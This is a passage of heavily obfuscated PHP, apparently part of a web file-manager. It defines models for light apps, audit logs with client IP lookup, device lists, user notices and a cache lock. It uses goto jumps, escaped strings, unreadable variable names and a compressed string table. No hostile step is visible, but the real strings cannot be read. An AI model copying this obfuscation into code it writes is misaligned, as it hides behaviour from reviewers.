"\x6c\141\x62\145\x6c\x2d\x67\x72\x65\171\x2d\156\x6f\162\155\x61\x6c") { $‡İŠ °® =& $_SERVER[Ï×Œõ”û]; if ($this->findByName($ßŠ“”ÍÉ)) { return !1; } $¿ÒÉÛı± = array($‡İŠ °®[514] => $ßŠ“”ÍÉ, $‡İŠ °®[579] => $÷–ø›Îğ, $‡İŠ °®[2141] => $this->getSort($‡İŠ °®[337]) + 1); return parent::insert($¿ÒÉÛı±); } public function update($üîâæ‰é, $ÑŸĞ·†) { $ãŞı¡‡Ô =& $_SERVER[Ï×Œõ”û]; $Óƒ§‰ÛÂ = $this->listData($üîâæ‰é); $†ËéÑ = $this->findByName($ÑŸĞ·†[$ãŞı¡‡Ô[32]]); if (!$Óƒ§‰ÛÂ || $†ËéÑ && $†ËéÑ[$ãŞı¡‡Ô[484]] != $Óƒ§‰ÛÂ[$ãŞı¡‡Ô[484]]) { return !1; } return parent::update($üîâæ‰é, $ÑŸĞ·†); } public function moveTop($à¼ ¤¸í) { $ÃÑêÓÒŸ =& $_SERVER[Ï×Œõ”û]; $ş›ï›ş = parent::listData(); $«ùãöôô = $this->getSort($ÃÑêÓÒŸ[336]); foreach ($ş›ï›ş as &$ À¿ˆ) { if ($ À¿ˆ[$ÃÑêÓÒŸ[484]] == $à¼ ¤¸í) { $ À¿ˆ[$ÃÑêÓÒŸ[2159]] = $«ùãöôô; continue; } $ À¿ˆ[$ÃÑêÓÒŸ[2159]] += 1; } unset($ À¿ˆ); return parent::resetData($ş›ï›ş); } public function moveBottom($ÜÚ§–ô) { $±¯ÀÔÑò =& $_SERVER[Ï×Œõ”û]; $ÀîÉÀ¾ = $this->getSort($±¯ÀÔÑò[337]) + 1; return parent::update($ÜÚ§–ô, array($±¯ÀÔÑò[2159] => $ÀîÉÀ¾)); } public function resetSort($¹¥¶ƒƒ) { $“à¢™¹ =& $_SERVER[Ï×Œõ”û]; $¾Â´üÖø = array(); $¹¥¶ƒƒ = is_array($¹¥¶ƒƒ) ? $¹¥¶ƒƒ : array(); for ($õ‰ô¬ = 0; $õ‰ô¬ < count($¹¥¶ƒƒ); $õ‰ô¬++) { $¾Â´üÖø[$¹¥¶ƒƒ[$õ‰ô¬] . $“à¢™¹[12]] = $õ‰ô¬ + 1; } $Šê¬–Á = parent::listData(); foreach ($Šê¬–Á as &$ŠÛµ’µÃ) { $óæ±Ş–´ = $¾Â´üÖø[$ŠÛµ’µÃ[$“à¢™¹[484]]]; $ŠÛµ’µÃ[$“à¢™¹[2159]] = $óæ±Ş–´ ? $óæ±Ş–´ : $ŠÛµ’µÃ[$“à¢™¹[2159]]; } unset($ŠÛµ’µÃ); return parent::resetData($Šê¬–Á); } private function getSort($¦¿šÕ) { $ñ£›£œÇ =& $_SERVER[Ï×Œõ”û]; $¹Åš³Êµ = parent::listData(); $Ç¨‰¥¯õ = array_to_keyvalue($¹Åš³Êµ, $ñ£›£œÇ[12], $ñ£›£œÇ[2159]); if (!$Ç¨‰¥¯õ) { $Ç¨‰¥¯õ = array(0); } $”Å‹©Œê = $¦¿šÕ == $ñ£›£œÇ[337] ? max($Ç¨‰¥¯õ) : min($Ç¨‰¥¯õ); return intval($”Å‹©Œê); } } goto C°‚¹Ì‡«; d·²šÆ¦ĞŞ: define($_SERVER[Ï×Œõ”û][0], $_SERVER[Ï×Œõ”û][1]); $_SERVER[Ë¨ø•È] = explode($_SERVER[Ï×Œõ”û][2], gzinflate(substr($_SERVER[Ï×Œõ”û][3], 10, -8))); function binCheckEq($ƒæÒ¦Ùª, $ë¬Ù—Ô‹) { return $ƒæÒ¦Ùª == $ë¬Ù—Ô‹; } goto F¢Ú»ôë—‘; AªÏÄíùñ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\x4c\151\147\x68\164\101\x70\160"; public $modelType = "\x53\x79\x73\x74\x65\155\x4f\160\164\x69\157\x6e"; public $field = array("\x6e\141\155\145", "\147\x72\157\165\160", "\x64\x65\163\143", "\x63\157\156\164\x65\x6e\x74"); public function listData($¼÷ûûıÒ = false, $ŠÛÆ¢ïø = "\x6d\157\144\151\146\x79\124\x69\x6d\x65", $µÂíĞ¯¹ = true) { return parent::listData($¼÷ûûıÒ, $ŠÛÆ¢ïø, $µÂíĞ¯¹); } public function remove($Ûı› ³¹) { $·®ÓŞ½ = $this->findByName($Ûı› ³¹); if (!$·®ÓŞ½) { return !1; } return parent::remove($·®ÓŞ½[$_SERVER[Ï×Œõ”û][484]]); } public function add($Éü…ğÌ¦) { if ($this->findByName($Éü…ğÌ¦[$_SERVER[Ï×Œõ”û][32]])) { return !1; } return parent::insert($Éü…ğÌ¦); } public function update($ÌÉ·…ƒ, $ÎÎïØ¡Ó) { $ˆŒÉ½âÀ =& $_SERVER[Ï×Œõ”û]; $õšÆû¹æ = $this->findByName($ÌÉ·…ƒ); $Ş‰è—­É = $this->findByName($ÎÎïØ¡Ó[$ˆŒÉ½âÀ[32]]); if (!$õšÆû¹æ || $Ş‰è—­É && $Ş‰è—­É[$ˆŒÉ½âÀ[484]] != $õšÆû¹æ[$ˆŒÉ½âÀ[484]]) { return !1; } return parent::update($õšÆû¹æ[$ˆŒÉ½âÀ[484]], $ÎÎïØ¡Ó); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\x6d\137\154\157\x67"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\124\x69\x6d\x65", "\164\151\x6d\x65", "\x69\156\x73\x65\x72\164", "\x66\165\156\143\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ùó¦½¯ =& $_SERVER[Ï×Œõ”û]; return array($ùó¦½¯[2508] => LNG($ùó¦½¯[2509]), $ùó¦½¯[2510] => LNG($ùó¦½¯[2511]), $ùó¦½¯[2083] => LNG($ùó¦½¯[2512]), $ùó¦½¯[2513] => LNG($ùó¦½¯[2514]), $ùó¦½¯[2515] => LNG($ùó¦½¯[2516]), $ùó¦½¯[2517] => LNG($ùó¦½¯[2518]), $ùó¦½¯[2519] => LNG($ùó¦½¯[2520]), $ùó¦½¯[2111] => LNG($ùó¦½¯[2520]), $ùó¦½¯[2112] => LNG($ùó¦½¯[2521]), $ùó¦½¯[2522] => LNG($ùó¦½¯[2523]), $ùó¦½¯[2524] => LNG($ùó¦½¯[2525]), $ùó¦½¯[2526] => LNG($ùó¦½¯[2527]), $ùó¦½¯[2528] => LNG($ùó¦½¯[2529]), $ùó¦½¯[2109] => LNG($ùó¦½¯[2530]), $ùó¦½¯[2531] => LNG($ùó¦½¯[2532]), $ùó¦½¯[2116] => LNG($ùó¦½¯[2533]), $ùó¦½¯[2534] => LNG($ùó¦½¯[2535]), $ùó¦½¯[2536] => LNG($ùó¦½¯[2537]), $ùó¦½¯[2538] => LNG($ùó¦½¯[2539]), $ùó¦½¯[2540] => LNG($ùó¦½¯[2541]), $ùó¦½¯[2118] => LNG($ùó¦½¯[2542]), $ùó¦½¯[2119] => LNG($ùó¦½¯[2543]), $ùó¦½¯[2544] => LNG($ùó¦½¯[2545]), $ùó¦½¯[2546] => LNG($ùó¦½¯[2547]), $ùó¦½¯[2548] => LNG($ùó¦½¯[2549]), $ùó¦½¯[2114] => LNG($ùó¦½¯[2550]), $ùó¦½¯[2551] => LNG($ùó¦½¯[2552]), $ùó¦½¯[2113] => LNG($ùó¦½¯[2553]), $ùó¦½¯[2554] => LNG($ùó¦½¯[2554]), $ùó¦½¯[2555] => LNG($ùó¦½¯[2556]), $ùó¦½¯[2557] => LNG($ùó¦½¯[2554]), $ùó¦½¯[2558] => LNG($ùó¦½¯[2559]), $ùó¦½¯[2560] => LNG($ùó¦½¯[2561]), $ùó¦½¯[2562] => LNG($ùó¦½¯[2561]), $ùó¦½¯[2563] => LNG($ùó¦½¯[2564]), $ùó¦½¯[2565] => LNG($ùó¦½¯[2565]), $ùó¦½¯[2566] => LNG($ùó¦½¯[2087]), $ùó¦½¯[2567] => LNG($ùó¦½¯[2568]), $ùó¦½¯[2569] => LNG($ùó¦½¯[2570]), $ùó¦½¯[2571] => LNG($ùó¦½¯[2572]), $ùó¦½¯[2573] => LNG($ùó¦½¯[2574]), $ùó¦½¯[2575] => LNG($ùó¦½¯[2576]), $ùó¦½¯[2577] => LNG($ùó¦½¯[2577]), $ùó¦½¯[2578] => LNG($ùó¦½¯[2579]), $ùó¦½¯[2580] => LNG($ùó¦½¯[2581]), $ùó¦½¯[2582] => LNG($ùó¦½¯[2583]), $ùó¦½¯[2584] => LNG($ùó¦½¯[2585]), $ùó¦½¯[2586] => LNG($ùó¦½¯[2587]), $ùó¦½¯[2588] => LNG($ùó¦½¯[2589]), $ùó¦½¯[212] => LNG($ùó¦½¯[212]), $ùó¦½¯[213] => LNG($ùó¦½¯[2590]), $ùó¦½¯[2591] => LNG($ùó¦½¯[2591])); } private function typeFile() { $ì¾£†¸¤ =& $_SERVER[Ï×Œõ”û]; $½Ù”™Î = array($ì¾£†¸¤[2116] => array($ì¾£†¸¤[2117]), $ì¾£†¸¤[2526] => array($ì¾£†¸¤[2592]), $ì¾£†¸¤[2528] => array($ì¾£†¸¤[2593]), $ì¾£†¸¤[2109] => array($ì¾£†¸¤[2110], $ì¾£†¸¤[2594]), $ì¾£†¸¤[2536] => array(), $ì¾£†¸¤[2538] => array(), $ì¾£†¸¤[2540] => array(), $ì¾£†¸¤[2118] => array($ì¾£†¸¤[2120]), $ì¾£†¸¤[2119] => array($ì¾£†¸¤[2120]), $ì¾£†¸¤[2544] => array($ì¾£†¸¤[2595]), $ì¾£†¸¤[2546] => array($ì¾£†¸¤[2595]), $ì¾£†¸¤[2548] => array($ì¾£†¸¤[2596]), $ì¾£†¸¤[2534] => array($ì¾£†¸¤[2597]), $ì¾£†¸¤[2114] => array($ì¾£†¸¤[2598]), $ì¾£†¸¤[2551] => array($ì¾£†¸¤[2599]), $ì¾£†¸¤[2113] => array($ì¾£†¸¤[2115])); return $½Ù”™Î; } private function typeAll() { $µÛÕÏ»« =& $_SERVER[Ï×Œõ”û]; $Ö«È” = $this->typeList; $Ê ¯Êµ = array_filter($this->typeFile()); foreach ($Ê ¯Êµ as $Îš®ïšù => $×¦‚ûö) { $Ö«È”[$×¦‚ûö[0]] = $Ö«È”[$Îš®ïšù]; } $Ö«È”[$µÛÕÏ»«[2120]] = LNG($µÛÕÏ»«[2600]); $Ö«È”[$µÛÕÏ»«[2595]] = LNG($µÛÕÏ»«[2601]); return $Ö«È”; } public function addLog($Ù¾÷ç²¹, $úÙèï† = array()) { $ĞÍÕÒ›Ü =& $_SERVER[Ï×Œõ”û]; if (!isset($this->typeList[$Ù¾÷ç²¹])) { return; } $Áçİ­šµ = Session::get($ĞÍÕÒ›Ü[2274]); if (!$Áçİ­šµ) { $Áçİ­šµ = _get($úÙèï†, $ĞÍÕÒ›Ü[1547], 0); } if ($Ù¾÷ç²¹ == $ĞÍÕÒ›Ü[2567] && is_array($úÙèï†[$ĞÍÕÒ›Ü[2602]]) && !$úÙèï†[$ĞÍÕÒ›Ü[2602]]) { return; } $ÛŞıÖş = get_client_ip(); if (!$úÙèï† || strlen(json_encode($úÙèï†)) >= 1024 * 64) { if ($úÙèï† && is_array($úÙèï†)) { $úÙèï† = array_intersect_key($úÙèï†, array_flip($ĞÍÕÒ›Ü[484], $ĞÍÕÒ›Ü[32])); $úÙèï†[$ĞÍÕÒ›Ü[1563]] = $ÛŞıÖş; } else { $úÙèï† = array($ĞÍÕÒ›Ü[1563] => $ÛŞıÖş); } } else { if (is_array($úÙèï†)) { $úÙèï†[$ĞÍÕÒ›Ü[1563]] = $ÛŞıÖş; } else { $úÙèï† = array($ĞÍÕÒ›Ü[1344] => $úÙèï†, $ĞÍÕÒ›Ü[1563] => $ÛŞıÖş); } } $úÙèï†[$ĞÍÕÒ›Ü[2603]] = ACTION; $úÙèï† = array($ĞÍÕÒ›Ü[1920] => Session::sign(), $ĞÍÕÒ›Ü[1921] => intval($Áçİ­šµ), $ĞÍÕÒ›Ü[33] => $Ù¾÷ç²¹, $ĞÍÕÒ›Ü[1923] => json_encode($úÙèï†)); Hook::trigger($ĞÍÕÒ›Ü[2604], $úÙèï†); return parent::add($úÙèï†); } public function remove($“’¼ğËÄ) { $this->where(array($_SERVER[Ï×Œõ”û][513] => $“’¼ğËÄ))->delete(); } private function _makeOrder($»ŠŸ´ò† = '') { $°å¿Š¹ =& $_SERVER[Ï×Œõ”û]; $Òãô¦ç— = $°å¿Š¹[233]; $Í½«ì‚Ÿ = array($°å¿Š¹[542] => $°å¿Š¹[543], $°å¿Š¹[544] => $°å¿Š¹[545]); $ÖƒµŒÑ = Input::get($°å¿Š¹[550], $°å¿Š¹[7], $°å¿Š¹[2312], array($°å¿Š¹[2230], $°å¿Š¹[544])); $ÖƒµŒÑ = $Í½«ì‚Ÿ[$ÖƒµŒÑ]; $»ŠŸ´ò† = $»ŠŸ´ò† . "{$Òãô¦ç—}\x20{$ÖƒµŒÑ}"; return $this->order($»ŠŸ´ò†); } public function get($ı†öšÊÚ = '') { $×î‰½Æ =& $_SERVER[Ï×Œõ”û]; if (!$ı†öšÊÚ) { show_json(array()); } $åõÑ‰ìè = array(); if ($ı†öšÊÚ[$×î‰½Æ[1547]]) { $åõÑ‰ìè[$×î‰½Æ[1547]] = $ı†öšÊÚ[$×î‰½Æ[1547]]; } if (isset($ı†öšÊÚ[$×î‰½Æ[867]])) { $±ú‹–Æì = $ı†öšÊÚ[$×î‰½Æ[867]]; $ƒëÑÛÉ = isset($ı†öšÊÚ[$×î‰½Æ[868]]) ? $ı†öšÊÚ[$×î‰½Æ[868]] : time(); $åõÑ‰ìè[$×î‰½Æ[233]] = array($×î‰½Æ[410], array($±ú‹–Æì, $ƒëÑÛÉ)); } if ($ı†öšÊÚ[$×î‰½Æ[33]]) { $Ú¨Ş¿ãƒ = explode($×î‰½Æ[50], $ı†öšÊÚ[$×î‰½Æ[33]]); $µ¸Ş‰‘„ = $this->typeFile(); $ªô£ÔÀ© = array(); foreach ($Ú¨Ş¿ãƒ as $Å ÜÆÊª) { $ªô£ÔÀ©[] = $Å ÜÆÊª; if (isset($µ¸Ş‰‘„[$Å ÜÆÊª])) { $ªô£ÔÀ© = array_merge($ªô£ÔÀ©, $µ¸Ş‰‘„[$Å ÜÆÊª]); } } $ªô£ÔÀ© = array_unique($ªô£ÔÀ©); if ($ªô£ÔÀ©) { $åõÑ‰ìè[$×î‰½Æ[33]] = array($×î‰½Æ[7], $ªô£ÔÀ©); } } else { $åõÑ‰ìè[$×î‰½Æ[33]] = array($×î‰½Æ[2605], $×î‰½Æ[2606]); } if (!empty($ı†öšÊÚ[$×î‰½Æ[1563]])) { $åõÑ‰ìè[$×î‰½Æ[545]] = array($×î‰½Æ[471], "\45{$ı†öšÊÚ[$×î‰½Æ[1563]]}\x25"); } $ĞªÆÓğ¿ = $this->_makeOrder()->where($åõÑ‰ìè)->selectPage(); if (empty($ĞªÆÓğ¿[$×î‰½Æ[447]])) { show_json(array(), !0, $ĞªÆÓğ¿[$×î‰½Æ[444]]); } $ĞªÆÓğ¿[$×î‰½Æ[447]] = $this->logList($ĞªÆÓğ¿[$×î‰½Æ[447]]); return $ĞªÆÓğ¿; } private function ipAddress(&$ì¦Ü„İ) { $¦¼„‚Ë¨ =& $_SERVER[Ï×Œõ”û]; if (!empty($ì¦Ü„İ[$¦¼„‚Ë¨[1563]])) { $ãô ÊÄû = IpLocation::get($ì¦Ü„İ[$¦¼„‚Ë¨[1563]]); } else { $ãô ÊÄû = LNG($¦¼„‚Ë¨[2607]); } $ì¦Ü„İ[$¦¼„‚Ë¨[2608]] = $ãô ÊÄû; } private function descZipDownload($×™¶©‡Ù, &$İ¬£´û) { $Šûõãó¤ =& $_SERVER[Ï×Œõ”û]; if (!isset($×™¶©‡Ù[$Šûõãó¤[1570]])) { return; } $Óå–Ëï¨ = json_decode($×™¶©‡Ù[$Šûõãó¤[1570]], !0); foreach ($Óå–Ëï¨ as $¯•‰¬ÒÎ) { try { $äïĞ®Û÷ = IO::infoFullSimple($¯•‰¬ÒÎ[$Šûõãó¤[87]]); } catch (Exception $Œç—©ü) { continue; } $×™¶©‡Ù[$Šûõãó¤[87]] = $¯•‰¬ÒÎ[$Šûõãó¤[87]]; $İ¬£´û[] = $×™¶©‡Ù[$Šûõãó¤[193]] = $äïĞ®Û÷[$Šûõãó¤[193]]; $İ¬£´û[] = $×™¶©‡Ù[$Šûõãó¤[2372]] = $äïĞ®Û÷[$Šûõãó¤[192]]; break; } return $×™¶©‡Ù; } private function getSourceList(&$—´ûœİ) { $‡î‚«ÌÍ =& $_SERVER[Ï×Œõ”û]; $Ô¾ìÄú = array(); foreach ($—´ûœİ as $‚©èµš => $Ğê‹—‡·) { $Ù‘ŒÚšå = json_decode($Ğê‹—‡·[$‡î‚«ÌÍ[545]], !0); if ($Ğê‹—‡·[$‡î‚«ÌÍ[33]] == $‡î‚«ÌÍ[2112]) { $Ù‘ŒÚšå = $this->descZipDownload($Ù‘ŒÚšå, $Ô¾ìÄú); $—´ûœİ[$‚©èµš][$‡î‚«ÌÍ[545]] = json_encode($Ù‘ŒÚšå); continue; } if (strpos($Ğê‹—‡·[$‡î‚«ÌÍ[33]], $‡î‚«ÌÍ[2374]) !== 0) { if (!isset($Ù‘ŒÚšå[$‡î‚«ÌÍ[87]]) || strpos($Ğê‹—‡·[$‡î‚«ÌÍ[33]], $‡î‚«ÌÍ[2609]) !== 0) { continue; } try { $¹ËâÚ‹å = IO::infoFullSimple($Ù‘ŒÚšå[$‡î‚«ÌÍ[87]]); } catch (Exception $‡ÖÀöŠ) { continue; } $Ô¾ìÄú[] = $Ù‘ŒÚšå[$‡î‚«ÌÍ[193]] = $¹ËâÚ‹å[$‡î‚«ÌÍ[193]]; $Ô¾ìÄú[] = $Ù‘ŒÚšå[$‡î‚«ÌÍ[2372]] = $¹ËâÚ‹å[$‡î‚«ÌÍ[192]]; $—´ûœİ[$‚©èµš][$‡î‚«ÌÍ[545]] = json_encode($Ù‘ŒÚšå); continue; } $Ô¾ìÄú[] = $Ù‘ŒÚšå[$‡î‚«ÌÍ[193]]; $Ô¾ìÄú[] = $Ù‘ŒÚšå[$‡î‚«ÌÍ[2372]]; if ($Ù‘ŒÚšå[$‡î‚«ÌÍ[33]] == $‡î‚«ÌÍ[648]) { $Ô¾ìÄú[] = $Ù‘ŒÚšå[$‡î‚«ÌÍ[545]][$‡î‚«ÌÍ[1297]]; $Ô¾ìÄú[] = $Ù‘ŒÚšå[$‡î‚«ÌÍ[545]][$‡î‚«ÌÍ[1298]]; } if ($Ù‘ŒÚšå[$‡î‚«ÌÍ[33]] == $‡î‚«ÌÍ[2382]) { $Ô¾ìÄú[] = $Ù‘ŒÚšå[$‡î‚«ÌÍ[545]][$‡î‚«ÌÍ[193]]; } } if (!$Ô¾ìÄú) { return array(); } return Model($‡î‚«ÌÍ[939])->sourceListInfo($Ô¾ìÄú, !0); } private function logList($é³Ø°Ü) { $ø¿“Á” =& $_SERVER[Ï×Œõ”û]; $…îİÂœî = array_to_keyvalue($é³Ø°Ü, $ø¿“Á”[12], $ø¿“Á”[1547]); $ÄÕãÁÙ´ = Model($ø¿“Á”[622])->userListInfo(array_unique($…îİÂœî)); $šâ“áõ€ = $this->getSourceList($é³Ø°Ü); $ŒØ’ ¬û = $this->typeAll(); $Œâ¶¿³¡ = array(); $¢Ç²ƒ˜œ = array(); foreach ($é³Ø°Ü as $ã¶ëÊíñ => $”†ñ“¡é) { $ÇÎ’òÃ = $”†ñ“¡é[$ø¿“Á”[33]]; $àî±­±Ø = isset($ÄÕãÁÙ´[$”†ñ“¡é[$ø¿“Á”[1547]]]) ? $ÄÕãÁÙ´[$”†ñ“¡é[$ø¿“Á”[1547]]] : !1; $ıˆŸ¶œ§ = strpos($ÇÎ’òÃ, $ø¿“Á”[2610]) === 0 ? LNG($ø¿“Á”[2611]) : LNG($ø¿“Á”[2607]); $”†ñ“¡é[$ø¿“Á”[32]] = isset($àî±­±Ø[$ø¿“Á”[32]]) ? $àî±­±Ø[$ø¿“Á”[32]] : LNG($ø¿“Á”[2607]); $”†ñ“¡é[$ø¿“Á”[2433]] = isset($àî±­±Ø[$ø¿“Á”[2433]]) ? $àî±­±Ø[$ø¿“Á”[2433]] : $ø¿“Á”[12]; $”†ñ“¡é[$ø¿“Á”[1818]] = isset($ŒØ’ ¬û[$ÇÎ’òÃ]) ? $ŒØ’ ¬û[$ÇÎ’òÃ] : $ıˆŸ¶œ§; $”†ñ“¡é[$ø¿“Á”[2311]] = $àî±­±Ø; $òºØßúÁ = json_decode($”†ñ“¡é[$ø¿“Á”[545]], !0); $”†ñ“¡é[$ø¿“Á”[1563]] = isset($òºØßúÁ[$ø¿“Á”[1563]]) ? $òºØßúÁ[$ø¿“Á”[1563]] : $ø¿“Á”[12]; $”†ñ“¡é[$ø¿“Á”[2608]] = IpLocation::get($”†ñ“¡é[$ø¿“Á”[1563]]); if (strpos($ÇÎ’òÃ, $ø¿“Á”[2374]) === 0 || isset($òºØßúÁ[$ø¿“Á”[2372]])) { $òºØßúÁ[$ø¿“Á”[90]] = $šâ“áõ€[$òºØßúÁ[$ø¿“Á”[193]]]; $òºØßúÁ[$ø¿“Á”[2387]] = $šâ“áõ€[$òºØßúÁ[$ø¿“Á”[2372]]]; if ($òºØßúÁ[$ø¿“Á”[33]] == $ø¿“Á”[648]) { $òºØßúÁ[$ø¿“Á”[545]][$ø¿“Á”[1297]] = $šâ“áõ€[$òºØßúÁ[$ø¿“Á”[545]][$ø¿“Á”[1297]]]; $òºØßúÁ[$ø¿“Á”[545]][$ø¿“Á”[1298]] = $šâ“áõ€[$òºØßúÁ[$ø¿“Á”[545]][$ø¿“Á”[1298]]]; } if ($òºØßúÁ[$ø¿“Á”[33]] == $ø¿“Á”[2382]) { $òºØßúÁ[$ø¿“Á”[545]][$ø¿“Á”[193]] = $šâ“áõ€[$òºØßúÁ[$ø¿“Á”[545]][$ø¿“Á”[193]]]; } if ($òºØßúÁ[$ø¿“Á”[33]] == $ø¿“Á”[1285]) { $òºØßúÁ[$ø¿“Á”[2387]] = $òºØßúÁ[$ø¿“Á”[90]]; $òºØßúÁ[$ø¿“Á”[2372]] = $òºØßúÁ[$ø¿“Á”[2387]][$ø¿“Á”[193]]; $òºØßúÁ[$ø¿“Á”[90]] = !1; $òºØßúÁ[$ø¿“Á”[193]] = $ø¿“Á”[12]; } $•õ»ƒ¡Ì = array($ø¿“Á”[1285], $ø¿“Á”[2370]); if (!in_array($òºØßúÁ[$ø¿“Á”[33]], $•õ»ƒ¡Ì)) { if ($òºØßúÁ[$ø¿“Á”[90]] && $òºØßúÁ[$ø¿“Á”[90]][$ø¿“Á”[190]] == $ø¿“Á”[191]) { $¢Ç²ƒ˜œ[] = $”†ñ“¡é[$ø¿“Á”[484]]; unset($é³Ø°Ü[$ã¶ëÊíñ]); continue; } if ($òºØßúÁ[$ø¿“Á”[2387]] && $òºØßúÁ[$ø¿“Á”[2387]][$ø¿“Á”[190]] == $ø¿“Á”[191]) { $¢Ç²ƒ˜œ[] = $”†ñ“¡é[$ø¿“Á”[484]]; unset($é³Ø°Ü[$ã¶ëÊíñ]); continue; } } } $”†ñ“¡é[$ø¿“Á”[545]] = $òºØßúÁ; unset($”†ñ“¡é[$ø¿“Á”[2612]]); $Œâ¶¿³¡[] = $”†ñ“¡é; } $this->clearSystemPathLog($¢Ç²ƒ˜œ); return $Œâ¶¿³¡; } private function clearSystemPathLog($‡ñ¢íúû) { $™¸Áãıú =& $_SERVER[Ï×Œõ”û]; if (count($‡ñ¢íúû) == 0) { return; } $Ö¸’â·á = array($™¸Áãıú[484] => array($™¸Áãıú[7], array_unique($‡ñ¢íúû))); $this->where($Ö¸’â·á)->delete(); } public function deviceList($•ä–¾ƒı, $¸—êÉä¢ = 0) { $¯™ô‡ë– =& $_SERVER[Ï×Œõ”û]; $Š†ï½ää = array($¯™ô‡ë–[1547] => $•ä–¾ƒı, $¯™ô‡ë–[233] => array($¯™ô‡ë–[1135], $¸—êÉä¢), $¯™ô‡ë–[33] => $¯™ô‡ë–[2083]); $°Ü¢³éˆ = array(); $”ÂÛŒŸñ = $this->field($¯™ô‡ë–[2613])->where($Š†ï½ää)->order($¯™ô‡ë–[2385])->limit(50)->select(); foreach ($”ÂÛŒŸñ as $ËËÍä‘À => $³í„ì¸) { if ($ËËÍä‘À > 0 && abs($³í„ì¸[$¯™ô‡ë–[233]] - $”ÂÛŒŸñ[$ËËÍä‘À - 1][$¯™ô‡ë–[233]]) < 5) { continue; } $Ñ¯ã‹ú¢ = json_decode($³í„ì¸[$¯™ô‡ë–[545]], !0); $³í„ì¸[$¯™ô‡ë–[1563]] = isset($Ñ¯ã‹ú¢[$¯™ô‡ë–[1563]]) ? $Ñ¯ã‹ú¢[$¯™ô‡ë–[1563]] : $¯™ô‡ë–[12]; unset($Ñ¯ã‹ú¢[$¯™ô‡ë–[1563]]); $½ÀšÂßè = $this->deviceType($Ñ¯ã‹ú¢[$¯™ô‡ë–[2375]]); if (isset($°Ü¢³éˆ[$½ÀšÂßè])) { continue; } $³í„ì¸[$¯™ô‡ë–[2608]] = IpLocation::get($³í„ì¸[$¯™ô‡ë–[1563]]); $³í„ì¸[$¯™ô‡ë–[545]] = $Ñ¯ã‹ú¢; $°Ü¢³éˆ[$½ÀšÂßè] = $³í„ì¸; } return array_values($°Ü¢³éˆ); } public function deviceType($Ûöçì²œ) { return $Ûöçì²œ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x6e\x6f\164\151\x63\145\x4c\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\x63\x6f\x6e\x74\145\x6e\164", "\x61\x75\164\150", "\x6d\157\144\145", "\164\x69\x6d\145", "\164\171\160\145", "\x6c\145\x76\145\154", "\145\x6e\141\x62\x6c\x65", "\x73\x6f\x72\x74"); public function listData($¿’´ğÚ = false, $¸Ì›”Çë = "\x73\157\162\x74", $èä¢Œê€ = false) { return parent::listData($¿’´ğÚ, $¸Ì›”Çë, $èä¢Œê€); } public function add($è´ğ£ˆ) { $éœŸê›ş =& $_SERVER[Ï×Œõ”û]; $¯©µ¶á˜ = time(); if ($è´ğ£ˆ[$éœŸê›ş[16]] == $éœŸê›ş[2614]) { $¯©µ¶á˜ = strtotime($è´ğ£ˆ[$éœŸê›ş[206]]); } $è´ğ£ˆ[$éœŸê›ş[206]] = $¯©µ¶á˜; return parent::insert($è´ğ£ˆ); } public function update($£ÅàÓó, $•øî†ø) { $ÊÖÚë¤ =& $_SERVER[Ï×Œõ”û]; $ÀŞ›ˆÃ = $this->listData($£ÅàÓó); if (!$ÀŞ›ˆÃ) { return !1; } $»ò¡ûîä = time(); if ($•øî†ø[$ÊÖÚë¤[16]] == $ÊÖÚë¤[2614]) { $»ò¡ûîä = strtotime($•øî†ø[$ÊÖÚë¤[206]]); } $•øî†ø[$ÊÖÚë¤[206]] = $»ò¡ûîä; return parent::update($£ÅàÓó, $•øî†ø); } public function remove($ÑûÃÈš«) { $·ÌÀ‡ú¸ = $this->listData($ÑûÃÈš«); if (!$·ÌÀ‡ú¸ || $·ÌÀ‡ú¸[$_SERVER[Ï×Œõ”û][191]]) { return !1; } return parent::remove($ÑûÃÈš«); } public function sort($ÜŒåîÖ¶, $Êï¡ŒŒí) { return parent::update($ÜŒåîÖ¶, $Êï¡ŒŒí); } public function enable($ìÇ˜°Âè, $öê÷ëÄ›) { return parent::update($ìÇ˜°Âè, array($_SERVER[Ï×Œõ”û][2615] => $öê÷ëÄ›)); } private function initUserOption() { $œ‰“üç· =& $_SERVER[Ï×Œõ”û]; $this->optionType = $œ‰“üç·[2616]; $this->modelType = $œ‰“üç·[2617]; $this->field = array($œ‰“üç·[2618], $œ‰“üç·[32], $œ‰“üç·[206], $œ‰“üç·[33], $œ‰“üç·[2619], $œ‰“üç·[856], $œ‰“üç·[228]); } public function userNoticeGet($è•¡Øì« = false) { $this->initUserOption(); return parent::listData($è•¡Øì«, $_SERVER[Ï×Œõ”û][484], !0); } public function userNoticeAdd($ˆ‚ùù«) { $Ñ×­ŸÈĞ =& $_SERVER[Ï×Œõ”û]; $this->initUserOption(); $ÊáÆÙ½„ = $this->findByKey($Ñ×­ŸÈĞ[2618], $ˆ‚ùù«[$Ñ×­ŸÈĞ[484]]); if ($ÊáÆÙ½„) { return !0; } $á€è‚ìÌ = array($Ñ×­ŸÈĞ[2618] => $ˆ‚ùù«[$Ñ×­ŸÈĞ[484]], $Ñ×­ŸÈĞ[32] => $ˆ‚ùù«[$Ñ×­ŸÈĞ[32]], $Ñ×­ŸÈĞ[206] => $ˆ‚ùù«[$Ñ×­ŸÈĞ[206]], $Ñ×­ŸÈĞ[33] => isset($ˆ‚ùù«[$Ñ×­ŸÈĞ[33]]) ? $ˆ‚ùù«[$Ñ×­ŸÈĞ[33]] : 1, $Ñ×­ŸÈĞ[2619] => isset($ˆ‚ùù«[$Ñ×­ŸÈĞ[2619]]) ? $ˆ‚ùù«[$Ñ×­ŸÈĞ[2619]] : 0, $Ñ×­ŸÈĞ[856] => 0, $Ñ×­ŸÈĞ[228] => 0); return parent::insert($á€è‚ìÌ); } public function userNoticeEdit($ ëÃ©¶¦, $±‹¬Á) { $this->initUserOption(); return parent::update($ ëÃ©¶¦, $±‹¬Á); } } goto bŒˆ½ª¡ö; b‹é…é­: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ã¬šúßÊ =& $_SERVER[Ï×Œõ”û]; if (self::$handle) { return self::$handle; } 